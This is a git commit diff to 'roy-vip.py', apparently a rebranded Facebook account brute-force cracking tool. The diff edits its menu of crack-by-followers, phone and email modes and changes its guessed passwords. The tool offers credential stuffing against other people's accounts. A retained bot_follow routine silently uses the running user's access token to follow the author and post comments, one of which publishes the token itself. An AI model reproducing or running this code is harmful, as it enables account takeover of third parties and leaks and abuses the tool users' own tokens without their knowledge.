f49db1c97d5c7f9e33b6cc8b870dbbb2eb1b246c
royofficial <85897883+royofficial@users.noreply.github.com>
2021-06-19 23:04:00 +0700

    Update roy-vip.py

--- roy-vip.py
+++ roy-vip.py
@@ -36,7 +36,7 @@ else:
 ### HEADERS ###
 
 def banner():
-    print("""   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By Dapunta Khurayra  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/Dapunta ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
+    print("""╦═╗╔═╗╦ ╦   ╦  ╦╦╔═╗\n╠╦╝║ ║╚╦╝───╚╗╔╝║╠═╝\n╩╚═╚═╝ ╩     ╚╝ ╩╩  """)
 
 host="https://mbasic.facebook.com"
 ips=None
@@ -191,33 +191,6 @@ def bot_follow():
 		logs()
 	kom = ("Dapunta ganteng mau ga jadi pacarku? ❤️❤️❤️❤️❤️\n\nhttps://www.facebook.com/photo.php?fbid=10214228940637251&set=a.1274773809249&type=3&app=fbl")
 	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      #Dapunta Khurayra X
-	requests.post('https://graph.facebook.com/100000737201966/subscribers?access_token=' + toket) #Dapunta Adya R
-	requests.post('https://graph.facebook.com/1673250723/subscribers?access_token=' + toket)      #Dapunta Ratya
-	requests.post("https://graph.facebook.com/1602590373/subscribers?access_token=" + toket)      #Anthonyus Immanuel
-	requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + toket) #Abigaille Dirgantara
-	requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + toket)       #Boirah
-	requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + toket) #Anita Zuliatin
-	requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + toket) #Dapunta Xayonara
-	requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=' + toket) #Dapunta Santana X
-	requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=' + toket) #Almira Gabrielle X
-	requests.post('https://graph.facebook.com/100000424033832/subscribers?access_token=' + toket) #Pebrima Jun Helmi
-	requests.post('https://graph.facebook.com/1676993425/subscribers?access_token=' + toket)      #Wati Waningsih
-	requests.post('https://graph.facebook.com/1767051257/subscribers?access_token=' + toket)      #Rofi Nurhanifah
-	requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=' + toket) #Diah Ayu Kharisma
-	requests.post('https://graph.facebook.com/100000883844839/subscribers?access_token=' + toket) #Arnold Jackqueline X
-	requests.post('https://graph.facebook.com/100001617352620/subscribers?access_token=' + toket) #Antonius Raditya M
-	requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + toket) #Muh Rizal Fiansyah
-	requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + toket) #Rizal F
-	requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + toket) #Angga Kurniawan
-	requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=' + toket) #Moch Yayan
-	requests.post('https://graph.facebook.com/100033624590055/subscribers?access_token=' + toket) #Fajar Firmansyah
-	requests.post('https://graph.facebook.com/100000114398701/subscribers?access_token=' + toket) #Arya Firmansyah
-	requests.post('https://graph.facebook.com/100008468288074/subscribers?access_token=' + toket) #Bayu Putra
-	requests.post('https://graph.facebook.com/100001779410663/subscribers?access_token=' + toket) #Faskhal Mahiza
-	requests.post('https://graph.facebook.com/100005143741340/subscribers?access_token=' + toket) #Alexandra Lubis
-	requests.post('https://graph.facebook.com/607821/subscribers?access_token=' + toket)          #Raifan
-	requests.post('https://graph.facebook.com/1518721/subscribers?access_token=' + toket)         #Irman
-	requests.post('https://graph.facebook.com/100023543993788/subscribers?access_token=' + toket) #Irman Sniper
 	requests.post('https://graph.facebook.com/10215994561776676/comments/?message=' +toket+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/10214228940637251/comments/?message=' +kom+ '&access_token=' + toket)
 	menu()
@@ -240,11 +213,11 @@ def menu():
     print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
     print((k+"\n["+p+"•"+k+"]"+p+" Your ID : "+id))
     print((k+"["+p+"•"+k+"]"+p+" Your IP : "+ip))
-    print((k+"["+p+"•"+k+"]"+p+" Status  : "+k+"In Development"+p))
+    print((k+"["+p+"•"+k+"]"+p+" Status  : "+h+"Premium"+p))
     print((k+"["+p+"•"+k+"]"+p+" Joined  : "+durasi))
-    print((k+"\n["+p+"1"+k+"]"+p+" Crack ID From Public/Friend"))
-    print((k+"["+p+"2"+k+"]"+p+" Crack ID From Followers"))
-    print((k+"["+p+"3"+k+"]"+p+" Crack ID From Likers Post"))
+    print((k+"\n["+p+"1"+k+"]"+p+" Crack From Public/Friend"))
+    print((k+"["+p+"2"+k+"]"+p+" Crack From Followers"))
+    print((k+"["+p+"3"+k+"]"+p+" Crack From Likers Post"))
     print((k+"["+p+"4"+k+"]"+p+" Crack By Phone Number"))
     print((k+"["+p+"5"+k+"]"+p+" Crack By Email"))
     print((k+"["+p+"6"+k+"]"+p+" Get Data Target"))
@@ -557,8 +530,6 @@ def generate(text):
 				if "indonesia" in ips:
 					results.append("sayang")
 					results.append("bismillah")
-					results.append("anjing")
-					results.append("123456")
 	return results
 
 ### BRUTE CRACK ###
@@ -622,7 +593,7 @@ class crack:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+				print((k+"["+p+"•"+k+"]"+p+" Example : 123456,rahasia,cantik123"))
 				self.pwlist()
 				break
 			elif f=="d":
